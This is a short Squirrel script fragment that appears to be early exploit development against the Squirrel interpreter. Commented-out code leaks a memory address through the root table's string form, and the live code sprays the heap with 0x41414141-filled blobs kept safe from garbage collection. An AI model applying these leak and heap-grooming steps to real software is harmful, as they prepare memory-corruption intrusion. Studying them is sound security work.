# local b = blob(512)
# #print(b)
# #print("\n")
# #print(b.weakref().tostring())
# local offset = 0x0
# local leak = (getroottable().tostring().slice(13,-1).tointeger(16)+offset)
# print(format("0x%016x\n",leak))

local noGC = []

for(local j = 0; j<0x20; j += 1)
    tmp <- blob(0x100)
    noGC.append(tmp)

    for(local i = 0; i<tmp.len(); i += 4)
        tmp.writen(0x41414141, 'i')